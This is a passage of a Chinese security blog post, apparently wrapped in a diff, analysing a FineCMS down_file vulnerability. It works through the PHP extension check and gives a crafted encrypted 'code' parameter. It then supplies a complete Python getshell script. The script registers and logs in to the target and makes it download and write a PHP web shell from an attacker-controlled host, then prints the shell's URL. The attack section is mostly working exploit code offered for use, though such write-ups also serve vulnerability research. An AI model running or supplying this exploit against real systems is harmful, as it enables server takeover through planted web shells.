+        <span class="o">!</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">dr_mkdirs</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
+</code></pre></div><ul>
+<li>继续下面这段,<code>$furl</code>是获取file参数的值，<code>dr_catcher_data</code>这个函数可以跟进看下，只要是获取远程文件的内容的。如果远程文件没有内容就获取失败。</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">        <span class="nv">$furl</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">);</span>
+        <span class="nv">$file</span> <span class="o">=</span> <span class="nx">dr_catcher_data</span><span class="p">(</span><span class="nv">$furl</span><span class="p">);</span>
+        <span class="o">!</span><span class="nv">$file</span> <span class="o">&amp;&amp;</span> <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;获取远程文件失败&#39;</span><span class="p">));</span>
+</code></pre></div><ul>
+<li>这段是判断扩展名的，在这里也说下这几个函数的作用吧，<code>strrchr</code>是把<code>$ful</code>的内容中.后面的值和.一起提取出来；<code>substr</code>返回字符串中1-10的字符串，也就是说刚才提取出来的扩展名<code>.php</code>从1开始只要php；<code>trim</code>去掉两边的空格；<code>strtolower</code>把字符串全部变成小写。
+再下来这句就是判断上传的文件的扩展名<code>$fileext</code>是否在<code>$ext</code>里面。</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$fileext</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nx">strrchr</span><span class="p">(</span><span class="nv">$furl</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">)));</span> <span class="c1">//扩展名
+</span><span class="c1"></span><span class="o">!@</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$fileext</span><span class="p">,</span> <span class="o">@</span><span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;远程文件扩展名（&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="o">.</span><span class="s1">&#39;）不允许&#39;</span><span class="p">));</span>
+</code></pre></div><ul>
+<li>这段的内容就是写文件了，文件名是随机的。</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$filename</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">time</span><span class="p">()),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span><span class="o">.</span><span class="nx">rand</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">999</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$path</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="p">,</span> <span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$info</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+                <span class="s1">&#39;file_ext&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="p">,</span>
+                <span class="s1">&#39;full_path&#39;</span> <span class="o">=&gt;</span> <span class="nv">$path</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="p">,</span>
+                <span class="s1">&#39;file_size&#39;</span> <span class="o">=&gt;</span> <span class="nx">filesize</span><span class="p">(</span><span class="nv">$path</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="p">)</span><span class="o">/</span><span class="mi">1024</span><span class="p">,</span>
+                <span class="s1">&#39;client_name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+            <span class="p">);</span>
+</code></pre></div><h3 id="构造扩展名参数">构造扩展名参数</h3>
+<p>这块内容可以另外当作一节来讲，重新来理顺刚才讲的代码流程就能知道如何来构造扩展名的参数。
+我们逆过来看：
+1.判断<code>$ext</code>里面的扩展名
+2.<code>$ext</code>变量获取在<code>$p['code']</code>数组里面
+3.<code>$p['code']</code>要经过<code>dr_authcode</code>函数的解密
+4.<code>$p['code']</code>又是从$url数组里面提取出来
+所以这里我们可以看到<code>$ext</code>是可控的，而我们要传入加密的<code>$p['code']</code>，我们用<code>dr_authcode</code>加密一遍就行了，在程序里面加入这句代码<code>echo dr_authcode(&quot;|php&quot;,&quot;a&quot;);</code>就可以得出加密的值，这个a可以写任意值，只要不写<code>DECODE</code>就行了。<code>|php</code>加密这个就是为了<code>list</code>这个函数的作用。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">        <span class="nv">$url</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">));</span>
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$url</span> <span class="k">as</span> <span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$item</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="nv">$t</span><span class="p">);</span>
+            <span class="nv">$p</span><span class="p">[</span><span class="nv">$item</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+        <span class="p">}</span>
+        <span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uid</span> <span class="o">&amp;&amp;</span> <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">fc_lang</span><span class="p">(</span><span class="s1">&#39;抱歉！游客不允许上传附件&#39;</span><span class="p">)));</span>
+        <span class="c1">//echo dr_authcode(&#34;|php&#34;,&#34;a&#34;);
+</span><span class="c1"></span>        <span class="k">list</span><span class="p">(</span><span class="nv">$size</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">,</span> <span class="nv">$path</span><span class="p">)</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="nx">dr_authcode</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">],</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">));</span>
+        <span class="nv">$fileext</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nx">strrchr</span><span class="p">(</span><span class="nv">$furl</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">)));</span> <span class="c1">//扩展名
+</span><span class="c1"></span>        <span class="o">!@</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$fileext</span><span class="p">,</span> <span class="o">@</span><span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;远程文件扩展名（&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="o">.</span><span class="s1">&#39;）不允许&#39;</span><span class="p">));</span>
+</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms_down3.png" alt="finecms_down3"></p>
+<p>构造出url的参数为：<strong>url=code=ad3eXTkH4Wt084pW46p7DBSt1KX0FwthAs4o9oBH8WVi</strong></p>
+<h3 id="构造file参数">构造file参数</h3>
+<p>构造代码：file=http://192.168.232.128/shell.php</p>
+<p>事情没有想得那么简单，这个函数的作用是下载然后再上传，它只是获取显示出来的html的内容然后把这些内容下载下来。所以我们直接在远程服务器写php文件是不可行的。
+远程的服务器有一个要求，就是不解析PHP文件，不解析，不就把内容显示出来了么。
+最简单的方法就是用装一个apache写一个php文件就行了。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms_down4.png" alt="finecms_down4"></p>
+<h1 id="用python写getshell脚本">用Python写Getshell脚本</h1>
+<p>写这个脚本也是要注册登录获取登录后的状态再getshell
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms_down5.png" alt="finecms_down5">
+<code>finecms_down_file.py</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="s1">&#39;&#39;&#39;
+</span><span class="s1">author:F0rmat
+</span><span class="s1">&#39;&#39;&#39;</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">rtarget</span><span class="p">):</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">999999</span><span class="p">)</span>
+    <span class="n">seed</span> <span class="o">=</span> <span class="s2">&#34;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>
+    <span class="n">email</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">email</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">seed</span><span class="p">))</span>
+    <span class="n">email</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">email</span><span class="p">)</span>
+
+    <span class="c1"># step 1 register</span>
+    <span class="n">register_url</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="s2">&#34;/index.php?s=member&amp;c=register&amp;m=index&#34;</span>
+    <span class="n">register_payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;back&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;data[username]&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&#34;data[password]&#34;</span><span class="p">:</span> <span class="s2">&#34;123456&#34;</span><span class="p">,</span> <span class="s2">&#34;data[password2]&#34;</span><span class="p">:</span> <span class="s2">&#34;123456&#34;</span><span class="p">,</span>
+                        <span class="s2">&#34;data[email]&#34;</span><span class="p">:</span> <span class="n">email</span> <span class="o">+</span> <span class="s2">&#34;@&#34;</span> <span class="o">+</span> <span class="n">email</span> <span class="o">+</span> <span class="s2">&#34;.com&#34;</span><span class="p">}</span>
+    <span class="c1"># step 2 login</span>
+    <span class="n">login_url</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="s2">&#34;/index.php?s=member&amp;c=login&amp;m=index&#34;</span>
+    <span class="n">login_payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;back&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;data[username]&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&#34;data[password]&#34;</span><span class="p">:</span> <span class="s2">&#34;123456&#34;</span><span class="p">,</span> <span class="s2">&#34;data[auto]&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">}</span>
+
+    <span class="n">url</span> <span class="o">=</span> <span class="n">target</span><span class="o">+</span><span class="s2">&#34;/index.php?s=member&amp;c=api&amp;m=down_file&#34;</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;code=ad3eXTkH4Wt084pW46p7DBSt1KX0FwthAs4o9oBH8WVi&#34;</span><span class="p">,</span><span class="s2">&#34;file&#34;</span><span class="p">:</span><span class="n">rtarget</span><span class="p">}</span>
+    <span class="c1"># step 3 start hacking&#34;</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">register_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">register_payload</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">login_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">login_payload</span><span class="p">)</span>
+    <span class="n">res</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">content</span>
+    <span class="n">hjson</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s2">&#34;php&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s2">&#34;shell:&#34;</span><span class="o">+</span><span class="n">target</span><span class="o">+</span><span class="s2">&#34;/uploadfile/&#34;</span><span class="o">+</span><span class="n">time</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s2">&#34;%Y%m&#34;</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;/&#34;</span><span class="o">+</span><span class="n">hjson</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s2">&#34;failure&#34;</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">5</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s1">&#39;python down_file_getshell.py -h http://127.0.0.1 -r http://10.0.0.1/shell.php&#39;</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="n">rtarget</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
+    <span class="n">exploit</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">rtarget</span><span class="p">)</span>
+</code></pre></div><h1 id="结束">结束</h1>
+<p><code>02:13:53</code>
+为了赶这篇文章现在已经深夜了，为了实现自己的承诺，坚持下去！</p>
+<h1 id="参考">参考</h1>
+<p><a href="http://0day5.com/archives/4405/">http://0day5.com/archives/4405/</a></p>
+<p><a href="https://github.com/F0r3at/Python-Tools/blob/master/finecms/down_file_getshell.py">https://github.com/F0r3at/Python-Tools/blob/master/finecms/down_file_getshell.py</a></p>
+<p><a href="http://php.net/manual/">http://php.net/manual/</a></p>
+
+    </article>
+
+    
+    <div class="prevnext">
+        
+
+
+
+<ul class="prevnext">
+    
+    <li>上一篇：
+        <a href="https://getshe11.com/post/dvwa-brute-force-update-/">
+            DVWA之Brute Force更新
+        </a>
+    </li>
+    
+    
+    <li>下一篇：
+        <a href="https://getshe11.com/post/seacms-v6.45-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/">
+            SeaCMS V6.45前台Getshell 代码执行漏洞(每日一洞)
+        </a>
+    </li>
+    
+</ul>
+
+    </div>
+    
+    <div class="post-comments">
+        
+  
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="F0r3at/Getshe11.com"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+    </div>
+</div>
+            </div>
+            
+            <div class="col-second">
+                <div class="col-box col-box-author">
+    <img class="avatar" src="../../images/avatar.jpg" alt="F0rmat">
+    <div class="col-box-title name">F0rmat</div>
+    <p>Stay Hungry, Stay Foolish.</p>
+    <p class="contact">
+        <a href="http://github.com/F0r3at">Github</a>
+    </p>
+</div>
+
+<div class="col-box">
+    <div class="col-box-title">Newest Posts</div>
+    <ul class="post-list">
+        
+        <li>
+            <a href="https://getshe11.com/post/pd-chrome-3d/" class="post-link">关于Kali2020安装Parallels Tools后Chrome显示空白</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/" class="post-link">Kali Linux 2020.4安装Parallels Tools</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/pathfinder/" class="post-link">Hackthebox-Pathfinder</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/domain-security/" class="post-link">Windows认证与域渗透</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/shield/" class="post-link">Hackthebox-Shield</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/archetype/" class="post-link">Hackthebox-Archetype</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/oopsie/" class="post-link">Hackthebox-Oopsie</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/vaccine/" class="post-link">Hackthebox-Vaccine</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/bc-penetration-diary/" class="post-link">Bc站渗透日记</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/" class="post-link">Maccms8最新命令执行漏洞</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/" class="post-link">Seacms9.92从变量覆盖到getshell</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/seacms-front-desk-getshell/" class="post-link">Seacms&lt;=9.92前台Getshell</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/a-difficult-penetration-process/" class="post-link">一次艰难的渗透提权过程</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/an-app-distribution-system-upload-vulnerability/" class="post-link">某云分发APP上传漏洞</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/analysis-of-php-deserialization-vulnerabilities/" class="post-link">浅析PHP反序列化漏洞</a>
+        </li>
+        
+    </ul>
+</div>
+
+<div class="col-box post-toc hide">
+    <div class="col-box-title">TOC</div>
+</div>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <div class="wrapper">
+    © 2021    <a href="https://getshe11.com">F0rmat</a>
+</div>
+    </footer>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@1.11.0/dist/jquery.min.js"></script>
+
+<script src="/js/easybook.js"></script>
+
+<script src="/js/lazysizes.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/dist/js/lightgallery-all.min.js"></script>
+<script src="/js/figure.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-XXXXXXXX-X', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+</body>
+
+</html>
